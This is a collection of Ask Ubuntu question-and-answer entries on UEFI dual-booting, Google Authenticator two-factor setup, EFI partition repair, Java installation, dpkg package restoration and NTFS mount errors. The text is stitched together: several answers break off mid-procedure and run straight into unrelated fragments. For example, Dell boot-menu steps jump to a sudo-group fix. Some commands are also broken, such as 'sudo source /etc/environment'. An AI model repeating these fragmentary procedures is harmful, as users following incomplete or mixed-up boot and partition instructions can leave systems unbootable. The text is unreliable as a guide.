From what I've been researching, in order for ubtuntu to be dualbooted with windows 10 on a uefi machine, the ubuntu installation media (in this case a usb) must also be booted from uefi (as opposed to changing the boot setting to Legacy and booting from usb that way), so that the correct grub-efi, instead of grub-pc, is installed.\nI have a Dell Inspiron 7000 series with core i7 processor its 64bit and also boots windows with uefi. This dell does not seem to support booting a usb from uefi as no matter what I try, \"Boot from usb\" will NOT appear under \"UEFI boot options.\" The only way for me to boot from the usb is to boot in legacy mode and then select boot from usb. The problem is, when I try to install ubuntu this way, after rebooting, my system boots directly to windows 10 and the grub option does not even appear, let alone the actual bootloader screen to select which OS I want to boot. I assume my problem is that I can not install ubuntu correctly since I have to boot the usb in legacy mode when trying to install. \nAlso, the filesystem on the usb appears as FAT32 which should be recognizable to windows to support usb uefi booting\nDoes anyone know of a way I can \"Boot from USB\" with \"UEFI boot option\"?\nI was following the steps on https://help.ubuntu.com/community/UEFI but under General Principles, number 5, I can not do this with my system. Can anyone help me with a workaround or anything?\n\nA: You don't say what tool you used to create your USB drive. This is a critical detail because not all boot programs are created equal. Rufus and Unetbootin usually work well for creating EFI-bootable media, but this varies somewhat from one computer to another, so even if you used one of those you might try something else.\nAnother option is to install in BIOS/CSM/legacy mode and then install my rEFInd boot manager from Windows. This will require that Secure Boot be disabled, but once rEFInd is up and running, it should enable you to boot Ubuntu.\n\nA: I've had the same issue for 1 year now on my Inspiron 5567 Kaby Lake 7500U. \nThe secret to install Ubuntu/Debian/any linux distrib on new Inspiron 5567 Kaby Lake is here: you need to create a special boot setup.\nFor a dual boot with a Windows 10 preinstalled :\n\n\n*\n\n*Burn your iso with Rufus (mostly GPT mode for laptop after 2013, config autoselected by default in Rufus.

You will need this info later.\n\n*Restart the PC with the USB plugged in. When the Dell logo appears, hit F12 till you see the boot menu. If you can see your USB key here, don't select it. First, enter the BIOS by selecting bios setup.\n\n*Go on Boot Sequence, you need to ensure the BIOS is set to UEFI, disable Legacy option ROMS and check that secure boot is enabled on the Secure Boot Enable line. \n\n*Now the most important operation... come back to Boot Sequence (General menu on the left)\n\n\n*\n\n*click on Add Boot Option. The Add Boot Option window will pop up. Type a name in the Boot Option Name text area (\"Ubuntu\", for example). \n\n*Click the button to the left of the File Name text area. The EFI Boot Selection window will pop up.\n\n*In the File System drop down menu choose FS0: and EFI. Then using the directories section, navigate until you can choose SHIMx64.EFI (for Ubuntu only - for other distros use grubx64.efi or grubx.efi if your PC is not amd64, anyway it will be named grubxxxxx.efi) in the Files section.\n\n\n*A new boot option will now appear on the top and in the boot menu. Save and exit\n\n*The pc will now restart, when the Dell logo is coming, press F12 again, till the boot menu appears.

Be careful that matthew != Matthew. To do that type this command:\ngrep 'matthew' /etc/group\n\nThe output should be something like:\nsudo:x:27:matthew\n\nBut if it doesn't then that means matthew is not a member of the group sudo and thus cannot execute commands with root privileges. Also because of that you cannot run anything sudo while still booted into your current session. \nThe workaround is to logout of your current session. Then in the welcome screen press Ctrl+Alt+F1.\nThen type the username as root and enter your password. After you are logged in, type:\nadduser matthew sudo\n\nNext, reboot using command:\nreboot\n\nHopefully, now, you would be able to use any sudo commands as matthew.\nEDIT: To check for the package libgluezilla do this apt-cache search libgluezilla.

The title pretty much says it. I have been hearing more about 2 factor authentication, one-time passwords, hard-tokens, and other improved security features. With the decreasing security of using just a password, I want to know how I can improve my security on Ubuntu. I am using 14.04 LTS with Unity.\n\nA: You can use the open-source Pluggable Authentication Module (PAM) created by Google, known as the Google Authenticator. This module is available in the standard repositories, as well as from GitHub so that you can build from source. Coupled with the Android, iOS, or Blackberry App of the same name, it creates time-based, time-sensitive codes for authentication along with your password. Since it is a PAM module, it can be dropped in pretty much anywhere. Let's get started!\nInstalling\nTo start, you can install the PAM with the following:\nsudo apt-get install libpam-google-authenticator\n\nSimple!\nSetting it up:\nAfter it's installed, you will want to also install the corresponding mobile application for Android, iOS, or Blackberry (depending on your mobile platform). Each one is useless without the other. After you have the application you need for your mobile device, run the following in a terminal:\ngoogle-authenticator\n\nThis will start by asking you a few questions The first one is the only one which you must answer \"Yes\" to, and it asks if you want the codes to be time-based. After that, read each question and make the choice that makes the most sense to you.\nUpon completing the initial set-up, you will see a very large QR code in your terminal, as well as some other information. The line that says \"Your New Secret Key Is:\" is a much needed line if you don't want to use the QR code for pairing your device, so don't close this window until you are set-up! The \"scratch codes\" this gives you are also important, as they are what you will use to log-in if you lose your mobile device. Write them down and store them somewhere safe.\nNow, on your mobile device, open your Google Authenticator application and select \"Set up account\". You can either scan the QR code that was generated, or select \"Use provided key\". If you scan the QR code, everything will be automatically saved under an account named \"your_user@your_host\". However, if you select \"Use provided key\", you will have to enter a name, key, and type of token manually. The name can be anything you wish. The key would be the secret key previously generated. The type would be the default time-based. After setting it up, you will see the account on the main pane of the Google Authenticator app, as well as a circle-shaped timer next to it. That timer depletes every 30 seconds, and a new code is generated.\nEnabling it!\nHere comes the magic. Since this is a PAM module, it can be used in a variety of places. I will walk through adding authentication to sudo requests, SSH log-ins, and lightdm log-in. However, after reading this tutorial, you will be able to enable it elsewhere based on the same techniques.\nSSH\nI'm doing this one first because there is an extra step. The first thing you need to do is to edit your SSH config file:\ngksudo gedit /etc/ssh/sshd_config\n\nSearch for the line that says:\nChallengeResponseAuthentication no\n\nand change the \"no\" to a \"yes\".\nNow, you need to edit the PAM module for ssh:\ngksudo gedit /etc/pam.d/sshd\n\nAt the very end of this file, add the following line:\nauth required pam_google_authenticator.so nullok\n\nThe \"nullok\" argument tells the system to not request a verification code if a user has not set-up two factor authentication. After that edit, go ahead and restart your ssh service:\nsudo service ssh restart\n\nsudo Requests\nEdit the PAM file for sudo:\ngksudo gedit /etc/pam.d/sudo\n\nAdd the following line at the very end:\nauth required pam_google_authenticator.so nullok\n\nNow every sudo request will ask for a verification code as well as a password.\nLightDM (GUI Log-In)\nEdit the PAM file for LightDM:\ngksudo gedit /etc/pam.d/lightdm\n\nAdd the following line at the very end:\nauth required pam_google_authenticator.so nullok\n\nThat's it! Everytime you log-in through the GUI, it will ask for a verification code after your password. \nSystem-Wide and TTY Log-In\nEven if you enable the above methods, it still won't ask for a verification code if you switch over to a TTY with CTRL+ALT+F#. To fix this, edit the common-auth PAM file:\ngksudo gedit /etc/pam.d/common-auth\n\nand add the following line to the very end:\nauth required pam_google_authenticator.so nullok\n\nNote: Since this common-auth file is included in all other auth type files, you need to remove the auth required lines from the other files. Otherwise, it will ask for the verification code twice and not allow you to log-in after.\nWrap-Up\nAs you could see, it was pretty easy to add this authentication in. If you use a display manager other than LightDM, you could easily just change the lightdm line above accordingly. Since your mobile device and your system shared this secret key already, they should always be in-sync. There is no interaction with Google servers, or any other internet resource for this set-up. Even if both devices were completely offline, the verification codes that show up in your application will be correct. Whenever you need to log-in through one of the methods you've enabled, just make sure to open up your mobile application and grab the current verification code.\nHave fun!!\n\nA: FreeOTP is an open-source alternative to the Google Authenticator Android app on Google Play (whose current code is not open source). FreeOTP is available on F-Droid (and Google Play).\n", "Q: Dual Boot Windows 10 and Linux Ubuntu on Separate Hard Drives How would I go about dual booting Windows 10 and Ubuntu, the windows drive is on an ssd as my c drive and my s drive is a hdd that I want to use for Linux. I have no idea what I need to download it or anything. \n\nA: This should work for most systems that use UEFI and which have two HDD.\nUpdate: Be careful with newer Windows systems like Windows 10/11 which may depend on a single UEFI bootloader partition to work properly, see 1 and 2\nSpecification used for the tutorial below:\nDell Inspiron E5440:\n\n*\n\n*Main HDD - 256GB Samsung SSD (Windows 10 installed)\n\n\n*Secondary HDD - 64GB Transcend mSATA SSD (Mint 18 was installed to this drive)\n\nA) UEFI/BIOS\n\n*\n\n*Set to \"UEFI mode only\" (no legacy/CSM).\n\n\n*Disable \"secure boot\"\n\n\n*Disable \"Intel Rapid Start\" (if equipped)\n\n\n*Disable \"fast boot\" in UEFI (note this is different than the \"fastboot\" setting in Windows 8/10).

From your description, I suspect that this is what's happening. Thus, if you've got a BIOS-mode installation on a GPT disk, it won't work; you must create a hybrid MBR. Note that rEFInd will only attempt an EFI-mode boot if it detects an EFI-mode boot loader, which it sounds like you have not installed. Thus, rEFInd is almost certainly not attempting an EFI-mode boot of Ubuntu.\nBTW, I'm the author of GPT fdisk and maintainer of rEFInd. Hybrid MBRs are dangerous things -- I've answered far too many questions from people who've wiped out their disks because of hybrid MBRs. Unfortunately, Apple designed its firmware to use them as a \"key\" to unlock BIOS-mode booting, so you're pretty much stuck with them if that's what you need.\nBacking up a bit, most Macs will boot Linux in EFI mode just fine. Given your description, though, you may have a 32-bit EFI. You can check this in rEFInd by reading the About/Info page; it should identify your firmware as being 32-bit or 64-bit (check the Platform: line). If you have a 32-bit EFI, you must use a 32-bit boot loader to boot Linux in EFI mode. This is difficult to do for various reasons -- the installers for 32-bit versions of Ubuntu can't be booted in EFI mode, and the installers for 64-bit versions of Ubuntu come with nothing but the 64-bit EFI boot loader. There are ways around this, but they involve significant hoop-jumping. See this question for more on this subject.\n", "Q: How can I merge two USB drive partitions into one?

The trouble is that the Boot Repair script has (mis?-)identified /dev/sda4 as holding GRUB's core.img file. OTOH, it's marked in the partition table as being an ESP. My suspicion is that one of two things has happened:\n\n\n*\n\n*When installing Windows, /dev/sda4 was used as the ESP, but the location of the partition happened to coincide with the location of a deleted BIOS Boot Partition, which holds GRUB 2 code for BIOS-mode boots. If Windows did not adequately wipe that old data, it might cause the filesystem to be misidentified by some Linux tools, which would result in the problem you're facing now.\n\n*At some point after installing Windows, you or a repair utility mistakenly wrote GRUB data \"raw\" to /dev/sda4. The grub-install command in a BIOS/CSM/legacy-mode boot might do this, but normally only if the partition was flagged as a BIOS Boot Partition, which it currently is not. Nonetheless, this is a possibility if the GRUB data were written here in some other way or if the partition's type code was changed to that of an ESP after the grub-install error.\n\n\nThe first of these explanations is the one you should hope for, since it means that the FAT filesystem data should be intact. In this case, the first step to recovery is to back up the partition (you may need to explicitly specify its filesystem type to mount it in Ubuntu, as in sudo mount /dev/sda4 -t vfat /mnt), unmount it, create a fresh FAT filesystem on it (sudo mkdosfs /dev/sda4), re-mount it, and restore the backed-up files. This should then enable Boot Repair to work. Note that you can do all of this in just about any OS, although you'd have to mount the ESP first if you do it in Windows (see below).\nAnother path to recovery would be to use my rEFInd boot manager on a USB flash drive or CD-R. If the ESP's filesystem is readable to the firmware, rEFInd should enable you to boot either Windows or Ubuntu. You could then create an /etc/fstab entry to mount /dev/sda4 at /boot/efi and install rEFInd via its Debian package or PPA. (Alternatively, you could install the grub-efi package and set it up yourself.) By itself, though, this approach will still leave confusing data on the ESP, so tools like Boot Repair will continue to be less than useful; to fully recover, you'd need to back up the ESP, create a fresh filesystem on it, and restore it. For that matter, I'm not entirely sure that rEFInd's installation script (used in the packages) would work correctly given the misidentification of the filesystem, so you might need to fix that problem even with this solution.\nIf the filesystem on /dev/sda4 is so badly damaged that you can't recover its files, you'll need to create a fresh filesystem on it, use a Windows recovery disk to re-install the Windows boot loader, and then recover Ubuntu to bootability by using either Boot Repair or rEFInd.\nNote that it's conceivable that the filesystem is readable in one or two environments but not all three. (The three environments being the EFI, Windows, and Ubuntu.) Windows doesn't normally mount the ESP, so you'd need to do so by typing mountvol S: /S in an Administrator Command Prompt window. (You can change S: to some other drive identifier, if you like.) Of course, your Boot Repair output already reveals that some Linux tools (like blkid) don't see a FAT filesystem on the disk, but it could still be readable by the kernel if you tell it to use the vfat driver, as in the mount /dev/sda4 -t vfat /mnt command I presented earlier.\n", "Q: How to autostart node forever and use spawn() as sudo on Ubuntu?

There are also no backports available.\nInstalling the package for one of the later Ubuntu releases is generally not recomended, as it may break your package db and prevent you from installing other packages or upgrading your currently installed ones.\n\nA: If you do not want to wait until 16.04 is released you can clone this repo: https://github.com/vivien/i3blocks and build it yourself. Look at the documentation if you don't know how to get it built. \nThis guide here was helpful when I went that route: http://kumarcode.com/Colorful-i3/, however, you are going to have to tweak a few things to get it working.

However, it's giving me an error message:\n\nI tried sudo apt-get update command as well but gave me the same error.\nPlease help.\nThanks.\n\nA: You should provide just the package name to apt-get, not a downloaded tarfile. This would install the package version from the Ubuntu repositories:\nsudo apt-get install snort\n\n\nA: From brouhaha:\n\nWhat is .tar.gz format?\nUnder Unix, tar archives are the most common means of distributing\n  bundles of files, and gzip is the most common compression program. A\n  .tar.gz file is simply a bundle of files packaged with tar, and\n  subsequently compressed with gzip.\nSometimes the extension \".tgz\" is used as an abbreviation for\n  \".tar.gz\". This is especially common on platforms such as MS-DOS that\n  have arbitrary constraints on filenames (no more than one dot, and no\n  more than three characters after the dot).\n\nFrom Wikipedia:\n\nDebian packages are standard Unix ar archives that include two tar\n  archives optionally compressed with gzip (zlib), Bzip2, lzma, or xz\n  (lzma2): one archive holds the control information and another\n  contains the program data.\n\nFrom Wikipedia:\n\nUbuntu is a Debian-based Linux operating system and distribution for\n  personal computers, smartphones and network servers.\n\nSince, Ubuntu is a debian-based OS thus, it uses *.deb packages to install software but if you want you may install softwares using .tar.gz files. But then in that case the commands will be different. Have a look at this answer for further information.\nFrom Ubuntu:\n\nThe apt-get command is a powerful command-line tool, which works with\n  Ubuntu's Advanced Packaging Tool (APT) performing such functions as\n  installation of new software packages, upgrade of existing software\n  packages, updating of the package list index, and even upgrading the\n  entire Ubuntu system.\n\nSo, if you want to install any software in Ubuntu, then you have to type the following command:\nsudo apt-get install <package-name>\n\nIn your case it would be:\nsudo apt-get install snort\n\n", "Q: Upgrade already installed ffmpeg software on ubuntu server I have ffmpeg version 2.2.5 installed on my server which is running on ubuntu.

I regretted it almost immediately but continued out of sheer stubbornness. But recently it finally went overboard.\nI have been using 15.10 since its release. I have an nvidia card on my laptop, and had to switch between proprietary drivers and nouveau because after some upgrades either one or another ceases to work properly (for example, stops recognizing an outside monitor or causes problems after suspend to RAM). Before the latest upgrade I had nouveau working reasonably well although sometimes the laptop would refuse to suspend to RAM.\nFirst, plasmashell got into the habit of crashing during the resume. Since I do not reboot my laptop very often (that might make me redo some rather lengthy computations) I had to restart it by hands. \nNow after I enter my password at the login screen, The screen goes black. It stays like that for some time and then I get back the login screen. I can switch to the console but restarting sddm or X server manually does not help. Neither does removing all config files in my home directory. The only thing that helps is rebooting the system in recovery mode and then resuming the normal boot (there is no need to do anything else after booting in the recovery mode). I would settle for this as a temporary solution but after a suspend to RAM the system does not power up the screen at all (even the consoles do not work).\nReplacing nouveau by nvidia does not help either; I tried several versions available in the repositories, but the outcome is always the same. With nvidia even the boot in the recovery mode does not help.\n\nA: The only download for this card available from the nvidia website is the \"linux long lived driver\" version 352. \nI suggest you try installing version 352 from the actual official Ubuntu repositories, especially if you have problems after every update.\nRun the following commands:\nsudo apt-get update\nsudo apt-get install nvidia-352\n\nPlease post any errors or further issues.\n", "Q: How do I open the man page for square brackets math and what are they called?

From this Stack Overflow post:\n\nThe manpage for bash v3.2.48 says:\n\n[...] The format for arithmetic expansion is:\n     $((expression))\n\nThe old format $[expression] is deprecated and will be removed in upcoming versions\n    of bash.\n\n\nYou should use $((...)) instead.\nNo, it doesn't have min or max functions.\n", "Q: Why isn't Ubuntu delivering USB images instead of ISO ones? So far Ubuntu (and derivatives) has been delivering ISO images to be burned onto optical media.\nThen there's a tool (usb-creator) to \"burn\" those ISOs onto USB drives.\nI could be wrong, but I think that nowadays the majority of users don't use optical media to install Ubuntu (as well as other OSs) also because optical drives are not any more standard.\nA \"USB image\" is usually \"burnt\" with a standard dd which is readily available within whatever OS you already have. While if you are not coming from Ubuntu it's likely your conversion tool is different from Ubuntu's and it won't work flawlessly.\nWhat is the advantage for Ubuntu to keep the ISO instead of a \"dd-able\" image?\n\nA: The current iso image is ddable and the images have been ddable for quite some time now as far as I know.\nsudo dd if=./ubuntu.iso of=/dev/sdx bs=16M\n\nWhere ./ubuntu.iso is the path to the actual file and /dev/sdx is the target USB drive.\nAlternatively, you can use cat instead of dd which is arguably faster like so:\nsudo -i\ncat ./ubuntu.iso > /dev/sdx\nexit\n\nAgain, ./ubuntu.iso represents the full path to the actual iso file and /dev/sdx is the actual USB device. \nEven if the image were not ddable, it would simply take a couple of syslinux commands to convert the image to ddable form.\n\nHypothetically, if the Ubuntu iso images were not ddable, you would just have to run the following commands:\nsudo apt-get install syslinux syslinux-utils\nisohybrid ./ubuntu.iso --entry 4 --type 0x1c\ndd if=./ubuntu.iso of=/dev/sdx bs=16M\n\nAgain, where ./ubuntu.iso is the path to the actual iso file and /dev/sdx is the actual USB device.\nsource\n", "Q: ubuntu 15.10 not loading desktop ubuntu boots past the desktop login screen to  a screen with a white Gear Icon.

When you install Ubuntu grub will install a default configuration that will include all your Windows and Linux OSes that are installed.\nIf you don't have any installed (as per your reference to having reformatted the drive) the boot can't continue.\nIf you're having problems installing Ubuntu on your freshly formatted drive, we can try to identify this problem after you boot to the install disk.\nIf it's Windows 7 that you are trying to install you a forum relating to Windows such as http://superuser.com can walk you thought those steps, which should be basically the same... boot to the Windows Install disk and proceed from there.

So in my case I have to manually run these commands:\nsudo /etc/environment(add the below two lines and append to PATH if needed)\nJAVA_HOME=/path-to-java-before-bin-directory\nexport JAVA_HOME\n\nsudo source /etc/environment\n\nand then it was working fine.\nverify it also:\nroot@ashu-700-430qe:/DataStax_POC# which java\n/usr/bin/java\nroot@ashu-700-430qe:/DataStax_POC# java -version\njava version \"1.8.0_66\"\nJava(TM) SE Runtime Environment (build 1.8.0_66-b17)\nJava HotSpot(TM) 64-Bit Server VM (build 25.66-b17, mixed mode)\nroot@ashu-700-430qe:/DataStax_POC#\n\nI referred this link. Hope this helps\n\nA: Java 8 is not available in the Ubuntu 12.04 repositories, but it is available from a Launchpad PPA.  \nYou also cannot update a Java version to the next Java version, but you can install different Java versions side by side.\nTo install Java version 8 (OpenJDK 8 edition - not ORACLE Java 8) open a terminal and execute :\nsudo add-apt-repository ppa:openjdk-r/ppa\nsudo apt-get update\nsudo apt-get install openjdk-8-jdk  \n\nIf you only want to install the Java Runtime Environment :  \nsudo apt-get install openjdk-8-jre  \n\nNote 1 : \nAs you said \"... without it being too complicated ...\", I assumed that you installed Java 7 from the Ubuntu repositories, which contain OpenJDK and did not add the WebUpd8 PPA (ORACLE Java).  \nNote 2 :\nAs you said that you get the File \"/usr/bin/add-apt-repository\", line 37 print _(\"The %s named '%s' has no PPA named '%s'\" ^ SyntaxError: invalid syntax error, have a look here. \nSuggestion : \nKeep both versions installed side by side, some other packages or programs might rely on Java 7.  \nHowever, when you don't want to have both versions and if don't need Java 7 anymore ... remove it.\n\nA: If you want keep both versions, and switch depending on your needs, consider the command:\nupdate-java-alternatives\nto make sure that a particular java (sun-java) is the default runtime. Use update-java-alternatives --list to display all possible options, and update-java-alternatives --set <java version name from --list> to switch it.\n\nA: An alternative is the Zulu port of OpenJDK which can be downloaded as a zip file, unpacked and used directly. \nIf needing to run from the command line, consider prepending the bin directory to $PATH in .bash_profile.\nDownloads available at http://www.azul.com/downloads/zulu/zulu-linux/\n(untested as I do not have a 12.04 system available.  It appears though that the requirement of glibc being at least 2.5 is satisfied)\n\nA: Another possible solution is to add the PPA repository from the project ubuntu-justchedavailable in the Github. This will provide a little bit different solution because it will download the Oracle JRE tarball to a previously configured directory and generate a DEB package from it.\nThat way you won't depend on somebody else packing the JRE, you will do it yourself (don't worry, it will be a automatic process).\n", "Q: 'Package not in database' when restoring with dpkg --set-selections I just reinstalled Ubuntu MATE 15.10 from scratch. I had followed this answer to save a list of installed packages and restore it on the newly installed system.\nHowever, when I do\nsudo dpkg --set-selections < packages-backup.list\n\nI get a long list of error messages like these:\ndpkg: warning: package not in database at line 1417: sqlite3\ndpkg: warning: package not in database at line 1417: sqliteman\ndpkg: warning: package not in database at line 1417: sqliteman-doc\n\nand finally\ndpkg: warning: found unknown packages; this might mean the available database is outdated, and needs to be updated through a frontend method\n\nSo I ran sudo apt-get update and re-ran dpkg but I keep getting the same error.\nI seem to get this error message for every single package in the list, including rather unspectacular ones such as the default kernel or sqlite. Also, I had not added any additional PPAs on my previous setup, thus packages from non-default repositories can't be the issue here.\nAs a test, I tried to install one of the \"offending\" packages with sudo apt-get install, which worked without any issues.\nWhat's going wrong here?\n\nA: The warnings are safe to ignore, as they only concern the dpkg database. Actual installation is done with APT, which doesn't use this database.\nWhen you are using dpkg in this manner, you need to use dselect-upgrade in order to apply the changes marked.\nsudo apt-get dselect-upgrade\n\nFrom man dpkg:\n\nNote that this file is mostly useless if\n   you don't use dselect but an APT-based frontend: APT has its own system to keep track of available packages.\n\n\nA: Try this:\nsudo apt-get install dselect && sudo dselect update\n\nAfter you can execute:\nsudo dpkg --set-selections < packages-backup.list\n\n\nA: This method does not require dselect package\nTo update dpkg database from apt cache:\napt-get update # can skip this\napt-cache dumpavail > /var/cache/apt/available\ndpkg --admindir=/var/lib/dpkg --update-avail /var/cache/apt/available\n\nOr one-liner with root:\ndpkg --admindir=/var/lib/dpkg --update-avail <(apt-cache dumpavail)\n\n\nA: In recent versions of Debian/Ubuntu/Mint, dpkg needs available packages to be in its \"avail\" database for dpkg --set-selections to work.\nExample sequence:\n\n*\n\n*(On other system) dpkg --get-selections > installed.dselect\n\n*sudo apt update\n\n*apt-cache dumpavail | sudo dpkg --merge-avail\n\n*sudo dpkg --set-selections < installed.dselect\n\n*sudo apt-get dselect-upgrade\nThe third command populates dpkg's \"avail\" database.  It's important to run this before setting the selections of which additional packages to install.\nThis reqires dpkg v1.17.7 and later.  See Q: Why does ''dpkg --set-selections'' not record selections for unknown packages? on the Debian wiki for more details.\n\nA: The following script was a workaround for me. Watch out for linux-images and linux-headers. If you have many of those in your dpkglist.txt then you might want to filter these out with grep -v commands like\n cat dpkglist.txt | grep \"$l_mode\" | grep -v linux-headers | grep -v linux-image-3 | grep -v linux-image-extra-3 | cut -f1\n\nscript to install and uninstall packages from dpkglist.txt via apt-get\n#!/bin/bash\n\n#\n# get the packages\n# \n# param 1: l_mode: install or deinstall\n#\npackages() {\n  local l_mode=\"$1\"\n  # get the lines for the given mode\n  cat dpkglist.txt | grep \"$l_mode\" |  cut -f1\n}\n\n#\n# loop over the packages in the given mode\n# param 1: l_mode: install or deinstall\n#\nloop() {\n  local l_mode=\"$1\"\n  for package in $(packages $l_mode)\n  do\n    case \"$l_mode\" in\n      install) apt-get -y install $package;;\n      deinstall) apt-get -y remove $package;;\n    esac\n  done\n}\n\n# do two loops\nloop deinstall\nloop install\n\n", "Q: apt-get not work and putty not connect When I want to login to ssh by putty show me this errors:\nConnection refused\n\nand when I connect to Ubuntu via VNC when I login I see this errors:\napt-config: error while loading shared libraries: libz.so.1: cannot open shared object file: no such file or directory\napt-config: error while loading shared libraries: libz.so.1: cannot open shared object file: no such file or directory\napt-config: error while loading shared libraries: libz.so.1: cannot open shared object file: no such file or directory\napt-config: error while loading shared libraries: libz.so.1: cannot open shared object file: no such file or directory\n/usr/bin/python3: error while loading shared libraries: libz.so.1: cannot open shared object file: no such file or directory\n\nand when I want to use apt-get command show me this error:\napt-get: error while loading shared libraries: libz.so.1: cannot open shared object file: no such file or directory\n\nwhat can I do for fix it?\nI can use every apt-get commands\nerror and error and error\n\nA: Your system is missing zlib, a very common data compression library. I think that the package manager doesn't rely on it any more, so you should be able to run\nsudo apt-get install --reinstall zlib1g\n\nto fix the issue. There is a high chance your package dependencies are still messed up after that, so I recommend a sanitary\nsudo apt-get install -f\n\nto check for and (hopefully fix) any remaining package management issues.\n", "Q: How to change root password back to DEFAULT I already set-up my root password in Ubuntu. But for some reasons now I need to set it back to default as when Ubuntu is freshly installed. I no more need my set root password. How can I set it back to default? I know my root password. When I supply with empty password to set it back to default it says \"Cannot be empty\"\n\n\nA: To lock the root account, making it unable to login with a password, use this command:\nsudo passwd -l root\n\nIt will retain whatever password you have set, but it will be unusable for all purposes.\nEDIT: This will be useful for any account, besides root.\nTo unlock the password for the account you previously locked, use this:\nsudo passwd -u root\n\nBTW: as was commented, you shouldn't use the root account, unless you really know what you're doing.\n", "Q: runlevel mismatch i am exploring the runlevel of ubuntu system,\nwhen i run runlevel, to display the current runlevel, i got:\nN 5\n\nbut inside the /etc/init/rc-sysinit.conf:\nenv DEFAULT_RUNLEVEL=2\n\nwhy default runlevel is different from my current runlevel, i didnt make any change to it\nand since the runlevel numbers stand for:\nCode        Description\n2           Graphical multi-user with networking\n3-5         Unused but configured the same as runlevel 2\n\ni am confused about that\n\nA: I was confused about this problem several days ago, at last I found out that ubuntu has now switch to \"systemd\" to complete the initialize and command the process since version 15.04, both \"initSysV\" and \"start-up\" are not used now. since /etc/init/rc-sysinit.conf is the configuration text of start-up …so …\nsystemd just use \"runlevel\" for compatibility.\nyou may make sure of this by looking into /sbin/init\n\nmt@mt-X550VC:~$ file /sbin/init\n/sbin/init: symbolic link to /lib/systemd/systemd\nmt@mt-X550VC:~$ ll /sbin/init\nlrwxrwxrwx 1 root root 20  2月 10 16:53 /sbin/init -> /lib/systemd/systemd*\n\nwhen you run \"init\" , you run \"systemd\" actually :)\ndetails here: https://en.wikipedia.org/wiki/Systemd\ncuriously , if you run \"init [2,4]\" on x-window, you will get stuck, the reason remains unknown to me. you can run \"init 5\" in tty1 to get back. but if you run \"runlevel\" then, you will get an output as \"3  5\" ,not \"2 5\" or \"4 5\",so i believe the variable \"runlevel\" was assigned to \"3\" when you run \"init [2,3,4]\", to \"5\" when \"init 5\".\ni am chinese and not good at english , hope I have made it clear enough :)\n", "Q: Ubuntu-Gnome 14.04 not suspend when inactive Suspending is working properly when I do manually or set time for inactive shorter than turning screen off timer but I want to turn screen off earlier and suspend the machine after 1-2 hours but it's not working.

You will see the new space as a black box in Disk Management marked as Unallocated Space.\nNow boot into Ubuntu from a live USB, assuming you have one from which you installed your Ubuntu. If not, create one (again?) via pendrivelinux.com and use your existing Ubuntu disk image or download a new one.\nYou should have GParted installed on your live USB, if not you can get it in the Ubuntu Software Center, Synaptic Package Manager, or by running sudo apt-get install gparted from a terminal window.\nRun GParted, find your hard disk Ubuntu main partition, and expand it.

I'm facing this Swift bug, which is fixed in the 2.6.0 release of Swift, on Ubuntu 14.04 server. \nI'm looking for a deb package of swift object server in version 2.6.0. As far as I know, cloud-archive (Ubuntu Server Team) provides version 2.5.0.\nAlternatively, is there a way to securely apply the patch (probably this piece of code) in a production environment ? I have not found any documentation in how to apply fix manually.\n\nA: You can download it, here:\nhttp://ftp.de.debian.org/debian/pool/main/s/swift/swift_2.6.0-1_all.deb\nOr here:\nhttp://ftp.dk.debian.org/debian/pool/main/s/swift/swift_2.6.0-1_all.deb\n\nA: The Ubuntu Cloud Archive generally tracks the versions which shipped with each OpenStack release.  The latest OpenStack release (Liberty) shipped with swift 2.5.0, which is what is in the cloud archive.\nThe swift project's series and milestone information, as well as the the projected OpenStack Mitaka release summary may be helpful to track.\n\nA: There are two different servers hosting the debian package for Swift.\nGermany Mirror\nDenmark Mirror\nThere shouldn't be a whole lot of difference, but it's possible that they have the bug figured out.  The way to find out is to install and try it.

I understand that with GNOME version numbers, you have the odd numbered releases being the unstable in-development series, and the even ones as the stable releases which the odd unstable ones become. So for instance I am currently running Ubuntu GNOME 15.10 with GNOME 3.18, and I installed GNOME 3.18 from the gnome3 and gnome3-staging PPAs in order to get there because Ubuntu GNOME is shipped with GNOME 3.16 due to issues with the release cycles of Ubuntu and GNOME not quite matching up so the latest version of GNOME is ready only after the time GNOME can submit the GNOME version to be used in the next Ubuntu release.\nAnyway, as I like to be on the edge with software I'm using I would like to know if there is any way for me to easily upgrade to the GNOME 3.19.x development series? Like is there a PPA or something I can get it with and stay up-to-date easily? And do I have to run Ubuntu GNOME 16.04 in order to do it or can it run on 15.10?\n\nA: You can install GNOME 3.19.x from those PPAs (though it may not fully be in the PPAs yet) if you install one of the Ubuntu GNOME 16.04 daily-builds. Otherwise you will have to wait for GNOME 3.20 to be available from them once Ubuntu GNOME 16.04 has been released.\nAs you can see though the GNOME 3.19.x versions are in the PPAs though:\n\n\nA: There is a github for gnome-shell , which you could clone\ngit clone https://github.com/GNOME/gnome-shell\n\nAnd build the new version form source to stay up to date.\nThere's also git for the gnome packages, for example for gedit you'd do this\ngit clone git://git.gnome.org/gedit\n\n", "Q: Cannot mount USB stick - errors out with \"$MFTMirr does not match $MFT\" I have an NTFS-formatted USB stick.  When I connect it to a Windows system, it works fine.  However, I receive this error output when I try and mount the USB stick on my Linux machine:\nError mounting /dev/sdb1 at /media/: Command-line `mount -t \"ntfs\" -o \"uhelper=udisks2,nodev,nosuid,uid=1000,gid=1000\" \"/dev/sdb1\" \"/media/sorin/LICENTA\"' exited with non-zero exit status 13: $MFTMirr does not match $MFT (record 0).\nFailed to mount '/dev/sdb1': Input/output error\nNTFS is either inconsistent, or there is a hardware fault, or it's a\nSoftRAID/FakeRAID hardware. In the first case run chkdsk /f on Windows\nthen reboot into Windows twice. The usage of the /f parameter is very\nimportant! If the device is a SoftRAID/FakeRAID then first activate\nit and mount a different device under the /dev/mapper/ directory, (e.g.\n/dev/mapper/nvidia_eahaabcc1). Please see the 'dmraid' documentation\nfor more details.\n\nWhat can I do to fix this issue and make my USB stick usable on Linux again?\n\nA: The error you are seeing indicates the filesystem is not clean and needs checked by Windows chkdsk.  There are components to NTFS filesystem ($MFT and $MFTMirr respectively in this case) which say what is where on the disk.  These files no longer match each other, which suggests there may be some type of filesystem corruption.\nBut because it is NTFS, the only way to truly repair NTFS is Windows' chkdsk utility.  (There is a ntfsfix command, but it is NOT going to be of the same quality of fix as Windows' utilities to check NTFS disks).\nWhen you next have your drive connected to the Windows system, if it asks you to scan and fix the drive, allow Windows to scan and fix the drive.  It will try and fix the errors in the filesystem that prevent you from mounting in Linux safely.\n\nA: Linux users need to use ntfsprogs utility. On recent Linux releases, you need to install ntfs-3g utilities, so:\nsudo apt-get install ntfs-3g or download from ntfs-3g-download\nntfsprogs is a suite of NTFS 